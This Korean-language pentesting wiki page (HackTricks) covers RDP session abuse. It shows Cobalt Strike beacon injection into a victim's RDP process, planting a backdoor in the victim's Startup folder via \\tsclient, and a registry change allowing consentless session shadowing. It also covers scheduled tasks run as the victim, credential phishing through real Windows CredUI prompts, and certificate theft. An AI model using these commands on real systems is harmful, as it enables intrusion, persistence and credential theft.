# RDP 세션 악용

{{#include ../../banners/hacktricks-training.md}}

## RDP 프로세스 인젝션

**외부 그룹**이 현재 도메인의 **컴퓨터**에 **RDP 액세스 권한**을 가지고 있다면, **공격자**는 해당 **컴퓨터를 침해하고 사용자가 접속할 때까지 기다릴 수 있습니다**.

해당 사용자가 RDP를 통해 접속하면, **공격자는 해당 사용자의 세션으로 pivot하여** 외부 도메인에서 해당 사용자의 권한을 악용할 수 있습니다.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
다른 tools를 사용해 세션을 탈취하는 **다른 방법**은 [**이 페이지에서 확인하세요.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

사용자가 자신을 기다리고 있는 **attacker**가 있는 **machine에 RDP로 접속**하면, attacker는 **사용자의 RDP session에 beacon을 주입**할 수 있으며, **victim이 RDP로 접속할 때 자신의 drive를 마운트했다면**, **attacker는 해당 drive에 접근할 수 있습니다**.

이 경우 **statup folder**에 **backdoor**를 작성하여 **victims**의 **original computer**를 바로 **compromise**할 수 있습니다.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

**local admin**인 경우, victim이 이미 **active RDP session**을 사용 중인 host에서 **password를 탈취하거나 LSASS를 dump하지 않고도 해당 desktop을 확인하거나 제어**할 수 있습니다.<sup>[[1]](#references)</sup>

이는 다음 위치에 저장된 **Remote Desktop Services shadowing** policy에 따라 달라집니다.<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
흥미로운 값:

- `0`: 비활성화됨
- `1`: `EnableInputNotify` (제어, 사용자 승인 필요)
- `2`: `EnableInputNoNotify` (제어, **사용자 승인 불필요**)
- `3`: `EnableNoInputNotify` (보기 전용, 사용자 승인 필요)
- `4`: `EnableNoInputNoNotify` (보기 전용, **사용자 승인 불필요**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
이는 RDP를 통해 연결한 privileged user가 잠금 해제된 데스크톱, KeePass session, MMC console, browser session 또는 admin shell을 열어 둔 경우 특히 유용합니다.

## Logged-On User로서의 Scheduled Tasks

**local admin**이고 대상 사용자가 **현재 logged on 상태**라면, Task Scheduler는 해당 사용자의 password 없이도 **그 사용자 권한으로 code를 시작**할 수 있습니다.<sup>[[1]](#references)[[4]](#references)</sup>

이를 통해 victim의 기존 logon session을 execution primitive로 활용할 수 있습니다:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
참고:

- 사용자가 **로그온하지 않은 경우**, Windows는 일반적으로 해당 사용자로 실행되는 task를 생성하려면 password를 요구합니다.
- 사용자가 **로그온한 경우**, task는 기존 logon context를 재사용할 수 있습니다.
- 이는 LSASS를 건드리지 않고 victim session 내부에서 GUI actions를 실행하거나 binaries를 시작하는 실용적인 방법입니다.

## Victim Session에서 CredUI Prompt Abuse

**Shadow RDP** 또는 **해당 사용자로 실행되는 scheduled task** 등을 통해 **victim의 interactive desktop 내부에서** 실행할 수 있게 되면, CredUI APIs를 사용해 **실제 Windows credential prompt**를 표시하고 victim이 입력한 credentials를 수집할 수 있습니다.<sup>[[1]](#references)</sup>

관련 APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

일반적인 flow:

1. victim session에서 binary를 spawn합니다.
2. 현재 domain branding과 일치하는 domain-authentication prompt를 표시합니다.
3. 반환된 auth buffer를 unpack합니다.
4. 제공된 credentials를 검증하고, 유효한 credentials가 입력될 때까지 선택적으로 prompt를 반복해서 표시합니다.

이는 prompt가 가짜 HTML form이 아니라 standard Windows APIs에 의해 render되므로 **on-host phishing**에 유용합니다.

## Victim Context에서 PFX 요청

동일한 **scheduled-task-as-user** primitive을 사용하면 로그온한 victim으로서 **certificate/PFX**를 요청할 수 있습니다. 해당 certificate는 이후 해당 사용자로 **AD authentication**에 사용할 수 있으므로 password theft를 완전히 피할 수 있습니다.<sup>[[1]](#references)[[5]](#references)</sup>

High-level flow:

1. victim이 로그온한 host에서 **local admin** 권한을 획득합니다.
2. **scheduled task**를 사용해 victim으로 enrollment/export logic을 실행합니다.
3. 생성된 **PFX**를 export합니다.
4. PKINIT / certificate-based AD authentication에 PFX를 사용합니다.

후속 abuse는 AD CS pages를 참조하세요:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
